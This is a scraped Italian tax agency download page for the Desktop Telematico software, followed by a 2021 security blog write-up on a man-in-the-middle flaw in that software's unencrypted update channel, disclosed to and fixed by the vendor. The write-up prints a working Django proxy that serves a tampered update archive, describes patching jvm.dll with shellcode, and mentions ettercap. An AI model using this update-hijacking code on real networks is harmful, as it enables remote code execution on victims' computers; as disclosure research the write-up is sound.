=== Content from telematici.agenziaentrate.gov.it_0b71a3df_20250114_211040.html ===


* [Salta ai contenuti della pagina](#contenuto)
* [Salta al Menu principale](#menuprinc)

[Ministero dell'Economia e delle Finanze](http://www.mef.gov.it)

Lingue disponibili:

* [ITAitaliano](https://www.agenziaentrate.gov.it/)
* [ENGinglese](https://www.agenziaentrate.gov.it/portale/web/english/nse/)
* [DEUdeutsch](https://www.agenziaentrate.gov.it/portale/web/deutsch/nsd/)

# Menu di servizio

* [Prenota appuntamento](https://www.agenziaentrate.gov.it/portale/prenota-un-appuntamento)
* [[Accesso ai servizi](https://www.agenziaentrate.gov.it/portale/come-accedere-servizi-online-agenzia)](https://www.agenziaentrate.gov.it/portale/come-accedere-servizi-online-agenzia)
* [Contatti e assistenza](https://www.agenziaentrate.gov.it/portale/contatta)
* [Trova l'ufficio](http://www1.agenziaentrate.gov.it/strumenti/mappe/)

[![Home Page Agenzia delle Entrate](/resources/img/AgenziaEntrate_logo_152.png)](https://www.agenziaentrate.gov.it/)

Apri menu principale

Seguici su:

* [facebook](https://www.facebook.com/agenziadelleentrate/ "Facebook")
* [twitter](https://twitter.com/Agenzia_Entrate "Twitter")
* [Linkedin](https://www.linkedin.com/company/agenzia-delle-entrate/ "Linkedin")
* [youtube](https://www.youtube.com/user/Entrateinvideo "YouTube")
* [RSS](https://www.agenziaentrate.gov.it/portale/rss "RSS")

Cerca nel sito:

Cerca

# Menu principale

* [Cittadini](https://www.agenziaentrate.gov.it/portale/cittadini)
* [Imprese](https://www.agenziaentrate.gov.it/portale/imprese)
* [Professionisti](https://www.agenziaentrate.gov.it/portale/professionisti)
* [Intermediari](https://www.agenziaentrate.gov.it/portale/intermediari)
* [Enti e Pa](https://www.agenziaentrate.gov.it/portale/web/guest/enti-e-pa)
* [L'Agenzia](https://www.agenziaentrate.gov.it/portale/agenzia)

[Area riservata](https://www.agenziaentrate.gov.it/portale/web/guest/area-riservata)

Ti trovi in:

* [Home](https://www.agenziaentrate.gov.it/portale/)
* [Tutti i servizi](https://www.agenziaentrate.gov.it/portale/Servizi)
* [Servizi Trasversali](https://www.agenziaentrate.gov.it/portale/Servizi/ServiziTrasversali)
* [Desktop Telematico](https://www.agenziaentrate.gov.it/portale/servizi/servizitrasversali/altri/desktoptelematico/indice%2Bdesktop%2Btelematico)
* Applicazione Desktop Telematico

# Applicazione Desktop Telematico

[Scarica il software](#collapse-1)

**Versione software: 1.2.0. del 13/03/2024**

La prima installazione dell'applicazione **Desktop Telematico** comporta la necessità di scaricare dal sito web dei Servizi Telematici l'eseguibile dell'applicazione e di salvarlo sulla postazione di lavoro dedicata.

L'eseguibile viene reso disponibile per gli ambienti operativi Windows, Macintosh e Linux.

Per migliorare il servizio e di conseguenza facilitare il prelievo dei programmi sono stati predisposti due distinti accessi indicati come "sito 1" e "sito 2".
Entrambe le connessioni garantiscono la stessa velocità di trasferimento.

**Il software che stai per scaricare dal sito dell'Agenzia delle Entrate è firmato digitalmente o verificabile tramite hash. La firma digitale o l'hash del file garantiscono la provenienza e l'integrità del programma.
Le istruzioni per la verifica del software sono disponibili nella pagina di [Verifica della firma](/Main/VerificaFirmaSoftware.jsp)**

Prima di procedere si consiglia di leggere le **[Istruzioni per l'installazione e la disinstallazione](/pdf/Manuale_di_installazione_Desktop_Telematico.pdf)**
in quanto le modalità di installazione variano in funzione dell'ambiente operativo.

**ATTENZIONE**

*Nel caso in cui si riscontrino in fase di installazione dell'applicazione su sistema operativo Windows errori del tipo: "Errore di LaunchAnywhere - Errore di Windows 3 (oppure Errore di Windows 2)
durante il caricamento di Java VM" si consiglia di scaricare anche il "file di installazione" con estensione "bat",
presente nelle Utility, copiarlo nella stessa cartella del file con estensione "exe" ed eseguire direttamente il file "bat".

Nel caso l'errore dovesse persistere, sarà necessario modificare il file "bat" seguendo le modalità indicate nelle [istruzioni](/pdf/istruzioni_utilizzo_bat.pdf).

Nel caso in cui si riscontrino errori in fase di avvio dell'applicazione su sistema operativo macOS
si consiglia di scaricare anche il "file di configurazione" "FixDTmac64.zip" contenuto nel link Utility per configurazione MacOs ed utilizzarlo seguendo le modalità indicate nelle [istruzioni macOS](/pdf/Istruzioni_macOS.pdf).*

|  | Codice di riscontro (sha256) | sito 1 | sito 2 |
| --- | --- | --- | --- |
| **Windows 11** |  | [sito 1](https://swdownload1.agenziaentrate.gov.it/repos/DesktopTelematico_win32_120_11.exe "DesktopTelematico_win32_120_11.exe") | [sito 2](https://swdownload2.agenziaentrate.gov.it/repos/DesktopTelematico_win32_120_11.exe "DesktopTelematico_win32_120_11.exe") |
| **Utility per installazione su Windows 11** | 82C269AF35A9E77154A365CA9D472F221B395998B87CA7C3D9C3FD07E4BEA59F | [sito 1](https://swdownload1.agenziaentrate.gov.it/repos/Installa_DesktopTelematico_win11.bat "Installa_DesktopTelematico_win11.bat") | [sito 2](https://swdownload2.agenziaentrate.gov.it/repos/Installa_DesktopTelematico_win11.bat "Installa_DesktopTelematico_win11.bat") |
| **Windows (versioni inferiori a Win 11)** |  | [sito 1](https://swdownload1.agenziaentrate.gov.it/repos/DesktopTelematico_win32_120.exe "DesktopTelematico_win32_120.exe") | [sito 2](https://swdownload2.agenziaentrate.gov.it/repos/DesktopTelematico_win32_120.exe "DesktopTelematico_win32_120.exe") |
| **Utility per installazione su versioni di Windows inferiori alla 11** | 9FDB035897168F1A616DE7B09A7116603417903A142FA62EA7FA39BB96EBF43D | [sito 1](https://swdownload1.agenziaentrate.gov.it/repos/Installa_DesktopTelematico.bat "Installa_DesktopTelematico.bat") | [sito 2](https://swdownload2.agenziaentrate.gov.it/repos/Installa_DesktopTelematico.bat "Installa_DesktopTelematico.bat") |
| **Macintosh (64 bit)** | 61F0D133AC0168CA0B55BA8B30B4893AAF4F2879109E05D2F53935EBDC78D248 | [sito 1 - zip](https://swdownload1.agenziaentrate.gov.it/repos/DesktopTelematico_mac64_120.zip "DesktopTelematico_mac64_120.zip") | [sito 2 - zip](https://swdownload2.agenziaentrate.gov.it/repos/DesktopTelematico_mac64_120.zip "DesktopTelematico_mac64_120.zip") |
| **Utility per configurazione macOS** | 949A0B4A994D66F359079C9851EF5157FBF3C4FE42FE41C5A7405E462AC27924 | [sito 1 - zip](https://swdownload1.agenziaentrate.gov.it/repos/FixDTMac64.zip "FixDTMac64.zip") | [sito 2 - zip](https://swdownload2.agenziaentrate.gov.it/repos/FixDTMac64.zip "FixDTMac64.zip") |
| **Linux (32 bit)** | 361001803093FEA8950FCD0867BA221CC6F40D9DA351066C3BAD1D349531ED60 | [sito 1 - zip](https://swdownload1.agenziaentrate.gov.it/repos/DesktopTelematico_linux32_120.zip "DesktopTelematico_linux32_120.zip") | [sito 2 - zip](https://swdownload2.agenziaentrate.gov.it/repos/DesktopTelematico_linux32_120.zip "DesktopTelematico_linux32_120.zip") |
| **Linux (64 bit)** | 8B4FFD2E61927A9FCEC47491D0094115153045F3237BE630F9B6EF10F1D36D5C | [sito 1 - zip](https://swdownload1.agenziaentrate.gov.it/repos/DesktopTelematico_linux64_120.zip "DesktopTelematico_linux64_120.zip") | [sito 2 - zip](https://swdownload2.agenziaentrate.gov.it/repos/DesktopTelematico_linux64_120.zip "DesktopTelematico_linux64_120.zip") |

[Informazioni](#collapse-2)

L'applicazione **Desktop Telematico** è un "contenitore"
destinato ad accogliere le applicazioni per la gestione dei flussi da inviare telematicamente (compilazione, controllo, autenticazione ed invio dei file telematici).

**Entratel, FileInternet** ed i vari **moduli di controllo e di compilazione** sono le applicazioni
che si possono installare all'interno del Desktop Telematico che provvede
a gestirne gli aggiornamenti in modo automatico.

Le principali caratteristiche dell'applicazione sono le seguenti:

* **Multi-utenza**

  L'applicazione è predisposta per la gestione della "Multi-utenza" consentendo di creare aree di lavoro distinte per ciascun utente che opera utilizzando la stessa postazione di lavoro.

  Ogni applicazione installata all'interno del "Desktop Telematico" può usufruire di tale opzione.

  L'accesso ad un'area di lavoro specifica viene gestito mediante l'inserimento di un "identificativo utente" e
  di una "password" liberamente scelti dall'utente in fase di primo accesso.

* **Configurazione dell'applicazione**

  L'applicazione permette all'utente di effettuare in maniera opportuna la configurazione della propria
  area di lavoro offrendo la possibilità di definire attraverso le funzioni "Impostazioni"
  e "Preferenze" del menù "File" alcune variabili specifiche dell'applicazione.

* **Auto-aggiornamento dell'applicazione**

  Una volta effettuata l'installazione iniziale dell'applicazione e di tutte le componenti software in essa integrate,
  le attivazioni successive dell'applicazione provvederanno a verificare, relativamente alle applicazioni installate,
  la presenza di eventuali aggiornamenti.

  La funzione di auto-aggiornamento prevede che sia stata precedentemente attivata la connessione ad internet.
  In caso di presenza di variazioni software verrà effettuato il "download" degli eventuali aggiornamenti
  e l'installazione degli stessi. Al termine sarà effettuato il riavvio dell'applicazione.

[Operazioni preliminari](#collapse-3)

L'eseguibile viene reso disponibile per gli ambienti operativi Windows, Macintosh e Linux.

In particolare:

* per Windows 11 l'applicazione rilasciata è valida sia per il sistema operativo a 32 bit che a 64 bit, con JVM versione 1.11 o superiori;
* per gli utenti con versioni di Windows inferiori alla Windows 11 l'applicazione rilasciata è valida sia per il sistema operativo a 32 bit che a 64 bit, con JVM versione 1.8 o superiori;
* per Macintosh l'applicazione rilasciata può essere utilizzata solo per il sistema operativo a 64 bit, con JVM versione 1.8 e superiori;
* per Linux l'applicazione viene rilasciata sia per il sistema operativo a 32 bit che a 64 bit, con JVM versione 1.8 e superiori.

[Requisiti tecnici](#collapse-4)

L'eseguibile viene reso disponibile per gli ambienti operativi Windows, Macintosh e Linux.

In particolare:

* per Windows 11 l'applicazione rilasciata è valida sia per il sistema operativo a 32 bit che a 64 bit, con JVM versione 1.11 o superiori;
* per gli utenti con versioni di Windows inferiori alla Windows 11 l'applicazione rilasciata è valida sia per il sistema operativo a 32 bit che a 64 bit, con JVM versione 1.8 o superiori;
* per Macintosh l'applicazione rilasciata può essere utilizzata solo per il sistema operativo a 64 bit, con JVM versione 1.8 e superiori;
* per Linux l'applicazione viene rilasciata sia per il sistema operativo a 32 bit che a 64 bit, con JVM versione 1.8 e superiori.

[Aggiornamenti](#collapse-5)

L'applicazione si avvale di un meccanismo di auto-aggiornamento: una volta effettuata la prima installazione dell'applicazione e
di tutte le componenti software in essa integrate, le attivazioni successive dell'applicazione provvederanno a verificare,
relativamente alle componenti software installate, la presenza di eventuali aggiornamenti.

# Informazioni sul sito dell'Agenzia delle Entrate

![Logo Agenzia delle Entrate](/resources/img/AgenziaEntrate_bianco_152.png)

---

[Amministrazione trasparente](https://www.agenziaentrate.gov.it/portale/agenzia/amministrazionetrasparente)

---

## Sede Legale

---

Agenzia delle Entrate

via Giorgione n. 106, 00147 Roma

Codice Fiscale e Partita Iva: 06363391001

## Assistenza

---

Per assistenza tecnica:

[assistenza.agenziaentrate.gov.it](http://assistenza.agenziaentrate.gov.it/)

## Seguici su

---

* [facebook](https://www.facebook.com/agenziadelleentrate/ "Facebook")
* [twitter](https://twitter.com/Agenzia_Entrate "Twitter")
* [Linkedin](https://www.linkedin.com/company/agenzia-delle-entrate/ "Linkedin")
* [youtube](https://www.youtube.com/user/Entrateinvideo "YouTube")
* [RSS](https://www.agenziaentrate.gov.it/portale/rss "RSS")

---

## Altre informazioni

* [Link utili](https://www.agenziaentrate.gov.it/portale/web/guest/link-utili)
* [Archivio](https://www.agenziaentrate.gov.it/portale/archivio)
* [Privacy e note legali](https://www.agenziaentrate.gov.it/portale/privacy)



=== Content from fibonhack.github.io_c90abd48_20250114_211039.html ===

![fibonhack](/logo/transparent/100.png)

[Home](/)
[Resources](/resources)
[Posts](/posts)
[Writeups](/writeups)
[Events](/events)

[Home](/)
[Resources](/resources)
[Posts](/posts)
[Writeups](/writeups)
[Events](/events)

fibonhack@templeos

:

~/Desktop Telematico (Agenzia delle entrate), MITM to RCE

$

cat page.txt

25 Apr 2021

# Desktop Telematico (Agenzia delle entrate), MITM to RCE

 by
[Mattia Furlani](/members/Maxpnl),
[Nicola Vella](/members/nick0ve)

Ciao a tutti, sono Mattia Furlani ed oggi vi parlerò di come sono riuscito a trovare un bug abbastanza grave all’interno del software Desktop Telematico, rilasciato dall’Agenzia delle entrate.

## Premesse

Fino all’anno scorso, chiunque usasse, per motivi lavorativi o personali, il software Desktop Telematico, rischiava di scaricare codice malevolo (virus o quant’altro) ogni volta che aggiornava il programma.

Questo perchè, nel caso nella stessa rete ci fosse stato un malintenzionato, quest’ultimo poteva modificare i file che venivano scaricati per l’aggiornamento tramite un attacco MiTM.

Il problema poteva sembrare innocuo o con poco riscontro nella vita reale. Tuttavia, dato l’obbligo di utilizzo di questo software per commercialisti e CAF, e che spesso le reti usate sono pubbliche o comunque che la password del wifi viene condivisa con molte persone, la questione cambia.

Pertanto, i dati detenuti da parte di queste figure professionali sono a rischio di essere rubati/manipolati/crittografati (basti pensare al danno che potrebbe fare un cryptolocker sul pc di un commercialista).

Ho già contattato l’azienda che sviluppa il software ed hanno risolto in tempi molto rapidi, quindi kudos a loro.

Per chi di voi svolge il ruolo di commercialista o utilizza il software Desktop Telematico, consiglio di assicurarsi che avete aggiornato il software dopo febbraio (circa), nel caso non l’aveste fatto invece riscaricate l’applicazione dal sito ufficiale.

Per quelli di voi interessati al processo che mi ha portato a scoprire il problema e sviluppare l’exploit per sfruttarlo, di seguito i dettagli tecnici.

### Come ho scoperto il problema

Durante il processo di apertura della mia partita IVA (del mio cappio al collo) ho avuto la necessità di usare il software Desktop Telematico per preparare un documento da inviare all’agenzia delle entrate.

All’apertura è iniziato un aggiornamento, mentre lo faceva mi è saltato all’occhio l’url da cui stava scaricando i file, `http://jws.agenziaentrate.it/...`.

Wow, non mi sembra molto sicuro scaricare degli aggiornamenti in chiaro, anche perchè, qualsiasi persona nella nostra stessa rete potrebbe intercettare il traffico e cambiarne il contenuto. Sul momento, non avendo molto tempo nè voglia avevo lasciato stare, tuttavia causa covid a capodanno ero a casa da solo e mi è rivenuto in mente quello che avevo trovato.

Vediamo se si può eseguire codice arbitrario… e come ho passato il capodanno :( …

## Analizzare il traffico con burp suite

Per fortuna BurpSuite permette di intercettare traffico HTTP che passa al di fuori del browser [(link alla doc)](https://portswigger.net/support/using-burp-suites-invisible-proxy-settings-to-test-a-non-proxy-aware-thick-client-application), questo mi ha permesso di visualizzare il traffico che passava.

Purtroppo non ho fatto nessuno screenshot, tuttavia a partire da questo file XML (http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/compositeContent.xml) chiamava ricorsivamente i vari *child* per vedere se c’erano aggiornamenti, questi avevano a loro volta un `content.jar` , che in realtà erano zip con all’interno un `content.xml` , che contiene istruzioni su dipendenze e versioni dei pacchetti.

```
<?xml version='1.0' encoding='UTF-8'?>
<?compositeMetadataRepository version='1.0.0'?>
<repository name='&quot;Sito applicazioni Entrate&quot;'
    type='org.eclipse.equinox.internal.p2.metadata.repository.CompositeMetadataRepository' version='1.0.0'>
  <properties size='1'>
    <property name='p2.timestamp' value='1315696288'/>
  </properties>
  <children size='39'>
  	<child location='Telematico-FileInternet'/>
    <child location='Telematico-Entratel'/>
    <child location='Telematico-Controlli'/>
    <child location='Telematico-Base'/>
    <child location='Telematico-Desktop'/>
    <child location='Telematico-Dichiarazioni'/>
    <child location='Telematico-Multiplatform'/>
    <child location='Controlli-Equitalia'/>
    <child location='Controlli-Anagrafico'/>
    <child location='Controlli-Atti-Registro'/>
    <child location='Controlli-Versamenti'/>
    <child location='Controlli-Dichiarazioni'/>
    <child location='Controlli-Dichiarazioni-2014'/>
    <child location='Controlli-Dichiarazioni-2015'/>
    <child location='Controlli-Dichiarazioni-2016'/>
    <child location='Controlli-Dichiarazioni-2017'/>
    <child location='Controlli-Dichiarazioni-2018'/>
    <child location='Controlli-Dichiarazioni-2019'/>
    <child location='Controlli-Dichiarazioni-2020'/>
    <child location='Controlli-Dichiarazioni-2021'/>
    <child location='Controlli-Dichiarazioni-Pregresse'/>
    <child location='Controlli-EntiEsterni-Contribuenti'/>
    <child location='Controlli-EntiEsterni-Operatori'/>
    <child location='Controlli-EntiEsterni-Enti'/>
    <child location='Controlli-Denunce'/>
    <child location='Controlli-IMU-TASI'/>
    <child location='Controlli-Collaborazione-Volontaria-2015'/>
    <child location='Controlli-Collaborazione-Volontaria-2017'/>
    <child location='Controlli-Collaborazione-Volontaria-2018'/>
    <child location='Controlli-CessioniQuote'/>
    <child location='Controlli-Locazioni'/>
    <child location='Controlli-Rendicontazione'/>
    <child location='Controlli-Dati-Estero'/>
    <child location='Controlli-Dati-Estero-DAC6'/>
    <child location='AsiliNido'/>
    <child location='Onlus'/>
    <child location='EntiEsterniCondivisa'/>
    <child location='Telematico-Comunicazioni'/>
	<child location='Controlli-EntiEsterni-ControlliGenerali-Condivisa'/>
  </children>
</repository>

```

Successivamente, se il software rileva che c’è un aggiornamento fa delle chiamate HTTP anche a degli `artifacts.jar`, contenenti solo il file `artifacts.xml`, che contiene dati riguardanti agli aggiornamenti (dimensioni, hash, etc..).

Per riassumere qui un esempio (striminzito) di come vengono fatte le chiamate

```
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/compositeContent.xml
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-FileInternet/content.jar
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Entratel/content.jar
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Controlli/content.jar
..... (fa il fetch dei vari content.jar in base al contenuto di compositeContent.xml)

```

Se dai content.jar rileva una nuova versione a quel punto inizia a prendersi gli artifacts come sotto

```
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-FileInternet/artifacts.jar
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Entratel/artifacts.jar
http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Controlli/artifacts.jar
...

```

Infine fa il fetch dei file a cui fanno riferimento gli artifacts, questo a meno che non li abbia già.

Questo è il modo in cui gestisce gli aggiornamenti [p2 equinox](https://www.eclipse.org/equinox/p2/), personalmente non ho avuto voglia di studiare in modo approfondito come funziona, tuttavia, se vede che nel content.jar c’è una nuova versione di uno dei componenti principali, scarica ricorsivamente le sue dipendenze, sempre che non le abbia già ad una versione accettabile (buona parte del mio tempo l’ho perso per riuscire a far sentire al programma la presenza di un aggiornamento, è un sistema complesso e a parer mio sovraingegnerizzato).

Una volta che sceglie i file di cui ha bisogno all’interno dei vari `contents.xml`, inizia a cercare il link di download a quei files da `artifacts.xml`

Analizzando il `content.xml` di `Telematico-Desktop`, ho notato questa parte

```
<unit id='it.sogei.telematico.application.prodotto_root.win32.win32.x86' version='1.0.2.202012301051'>
  <provides size='1'>
    <provided namespace='org.eclipse.equinox.p2.iu' name='it.sogei.telematico.application.prodotto_root.win32.win32.x86' version='1.0.2.202012301051'/>
  </provides>
  <filter>
    (&amp;(osgi.arch=x86)(osgi.os=win32)(osgi.ws=win32))
  </filter>
  <artifacts size='1'>
    <artifact classifier='binary' id='it.sogei.telematico.application.prodotto_root.win32.win32.x86' version='1.0.2.202012301051'/>
  </artifacts>
  <touchpoint id='org.eclipse.equinox.p2.native' version='1.0.0'/>
  <touchpointData size='2'>
    <instructions size='2'>
      <instruction key='uninstall'>
        cleanupzip(source:@artifact, target:${installFolder});
      </instruction>
      <instruction key='install'>
        unzip(source:@artifact, target:${installFolder});
      </instruction>
    </instructions>
  </touchpointData>
</unit>

```

Sembra che si possa far scaricare uno zip all’applicativo e farglielo estrarre nella sua cartella di root, questo serve per scaricare una nuova versione dell’eseguibile principale.

Analizzando anche `artifacts.xml` si può notare che il file scaricato non viene neanche sottoposto ad un controllo dell’hash, tuttavia anche se lo fosse stato, sarebbe comunque stato possibile modificarlo, a causa dell’assenza di SSL.

```
<artifact classifier='binary' id='it.sogei.telematico.application.prodotto_root.win32.win32.x86' version='1.0.2.202012301051'>
  <properties size='1'>
    <property name='download.size' value='114293'/>
  </properties>
</artifact>

```

Come ho accennato prima, `artifacts.xml` da anche informazioni su dove andarsi a prendere il file, di fatti questo file è raggiungibile all’url

```
/telematicoEntrateUpdateSite/Telematico-Desktop/binary/it.sogei.telematico.application.prodotto\_root.win32.win32.x86\_1.0.2.202012301051

```
## Patchare la JVM

All’interno delle cartelle del programma c’è la cartella `jre`, contenente i file relativi al runtime di java, in particolare il file `\DesktopTelematico\jre\bin\client\jvm.dll` viene usato per far partire l’applicazione.

Ho scelto di usare quel file per applicare la mia patch (contenente il codice che voglio far eseguire assieme all’aggiornamento), questo perchè il binario è abbastanza semplice e non dovrebbe avere alcun tipo di offuscamento strano.

Come prima cosa (grazie al consiglio di Nicola Vella) ho creato un nuova sezione eseguibile usando [CFF Explorer](https://ntcore.com/?page_id=388), sotto si può vedere la differenza tra le sezioni prima e dopo le modifiche fatte grazie a questo tool

![Before](/assets/files/DesktopTelematico/Pasted image 20210422002433.png)
![After](/assets/files/DesktopTelematico/Pasted image 20210422002553.png)

Ho aggiunto quindi questa nuova sezione al binario chiamata `patch`, con una dimensione abbondantemente grande per inserire il mio codice.

Successivamente ho cercato uno shellcode che eseguisse calc.exe, ho aggiunto il codice al binario col mio magico `radare2` e, grazie a [x64dbg](https://x64dbg.com/#start) (che pare funzioni bene per debuggare file dll), sono riuscito a sistemare lo stack in modo che, dopo che saltavo sul mio codice, il programma riuscisse a procedere con la sua normale esecuzione senza problemi.

Oltre a questo ho avuto la necessità di scrivere poche righe in assembly per evitare che `calc.exe` venisse fatto partire continuamente, questo per salvaguardare un po’ il mio povero PC, tuttavia non sto a mostrarlo visto che importa poco.

## Scrivere il server per il MITM

Arrivato a questo punto sapevo già che file andare a sovrascrivere e come farglielo scaricare, l’unico pezzo che mi mancava era scrivere un miniserver web che cambiasse solo i file necessari al mio PoC tra le tante risposte che inviava il server.

I file da sostituire erano tre:

* telematicoEntrateUpdateSite/Telematico-Desktop/artifacts.jar
* telematicoEntrateUpdateSite/Telematico-Desktop/content.jar
* telematicoEntrateUpdateSite/Telematico-Desktop/binary/it.sogei.telematico.application.prodotto\_root.win32.win32.x86\_1.0.3.202012301051

In questo caso dentro `artifacts.xml` e `content.xml` ho dovuto sostituire tutte le stringhe che facevano riferimento alla versione corrente di `it.sogei.telematico.application.prodotto_root.win32.win32.x86` con una nuova versione fittizzia, la `1.0.3.202012301051`.

Oltre a questo, per fare in modo che al client importasse di questa nuova versione, ho dovuto cambiare la versione di `it.sogei.telematico.application.prodotto`, che sembra sia il *“main”* del file content.xml, in parole povere, il client, prima controlla se questo pacchetto ha un aggiornamento, e solo dopo controlla se ha tutti i pacchetti `required` ad una versione accettabile, nel caso gliene manchi qualcuno lo scarica.

Quindi, siamo arrivati al punto cruciale, ora ci basta scrivere quel miniserver di cui parlavo.

L’idea è che il dominio jws.agenziaentrate.it dovrà puntare a questo webserver, in modo che tutti i file vengano richiesti a quest’ultimo. Ogni volta che arriva una richiesta lui controlla se deve sostituirla con un file tra quelli elencati sopra, se lo deve fare ritorna il contenuto di quel file, altrimenti fa una richiesta all’ip del server ufficiale, ne prende la risposta, e la manda al nostro client, questo è il (terribile) codice della view

```
import requests
from django.http import HttpResponse

ip = "http://217.175.50.78/"

to_subst = {
    "telematicoEntrateUpdateSite/Telematico-Desktop/artifacts.jar": "./artifacts.zip",
    "telematicoEntrateUpdateSite/Telematico-Desktop/content.jar": "./content.zip",
    "telematicoEntrateUpdateSite/Telematico-Desktop/binary/it.sogei.telematico.application.prodotto_root.win32.win32.x86_1.0.3.202012301051": "./exploit.zip"
}

def interceptAndModify(request, path):
    right_fun = {
        "GET": requests.get,
        "HEAD": requests.head,
    }
    resp = None

    if path not in to_subst.keys():
        right_fun = right_fun[request.method]
        r = right_fun(f"{ip}{path}")
        resp = HttpResponse(
            status=r.status_code,
        )
        if hasattr(r, "content"):
            resp.content = r.content
    else:
        right_fun = right_fun["HEAD"]
        r = right_fun(f"{ip}{path}")
        print(path, "content subs")
        resp = HttpResponse(
            status=r.status_code
        )
        if request.method == "GET":
            with open(to_subst[path], "rb") as rd:
                resp.content = rd.read()

    if not (path in to_subst.keys() and r.status_code == 404):
        orig_headers = r.headers
        for y in ["Content-Length", "Connection", "Keep-Alive", "Content-Type"]:
            if y in orig_headers:
                del(orig_headers[y])
        for x, k in orig_headers.items():
            resp[x] = k
    else:
        print("skipping orig 404 headers")
        resp.status_code = 200
        resp["X-Powered-By"] = "Sogei S.p.A."
    if path in to_subst.keys():
        print(path, "last modified changed")
        resp["Last-Modified"] = "Wed, 20 Dec 2021 08:28:00 GMT"

    if resp.status_code != 404:
        resp["Content-Type"] = "application/java-archive"
    return resp

```

e questo quello che gestisce la route (sì lo so potevo usare flask al posto di django ma vabbè)

```
from django.urls import re_path
from .views import interceptAndModify
urlpatterns = [
    re_path(r'^(?P<path>.*)$', interceptAndModify),
]

```
## Demo time!

Finalmente posso dimostrare come, usando ettercap, da un pc connesso alla stessa rete della vittima, si possa fare un MiTM e, da questo, arrivare ad eseguire codice remoto (in questo caso aprire calc.exe) quando la vittima apre il programma (e lascia che l’aggiornamento automatico venga completato)

## Conclusioni

Pur quanto fosse molto semplice accorgersi del bug, lo sviluppo dell’exploit non è stato altrettanto facile. Detto questo, non sarebbe male se in Italia fosse istituito un programma di bug bounty per gli applicativi della PA, cosicché falle di sicurezza come quella presentata in questo post, verrebbero segnalate e sistemate più velocemente e, soprattutto, non utilizzate da malintenzionati.

Al momento ci sono delle linee guida sulla responsible disclosure per alcuni applicativi come PagoPA, ma non vengono offerte ricompense a chi segnala problemi di sicurezza, il che non incoraggia appassionati ed esperti a spendere del tempo alla ricerca di problemi. Qui un esempio di cosa ha portato l’iniziativa [Hack The Pentagon](https://www.hackerone.com/hack-the-pentagon):

![Hack the Pentagon](/assets/files/DesktopTelematico/htp.png)

Inoltre, sia per un fattore di trasparenza nei confronti dei cittadini, sia per permettere a questi di contribuire alla risoluzione di problemi sugli applicativi pubblici, sarebbe ideale rendere i software rilasciati ed usati dalla pubblica amministrazione open source, [qui](https://publiccode.eu/it/) vengono spiegati i vantaggi che comporterebbe.

Sono rimasto colpito dalla prontezza con la quale il team di sviluppo Sogei sia riuscito a sistemare il problema, ho reportato il bug a capodanno e dopo circa una settimana il problema è stato preso in carico in modo molto professionale.

Ringrazio Nicola Vella per i consigli sullo sviluppo dell’exploit, Jacopo Bonomi per le sue skills da letterato (e per come probabilmente cambierà le conclusioni), infine Alessio De Pauli per aver provato a fare magie coi bytecode di Java prima di scoprire quell’unzip.

fibonhack@templeos

:

~/Desktop Telematico (Agenzia delle entrate), MITM to RCE

$

theme developed by [just-hms](https://github.com/just-hms/)


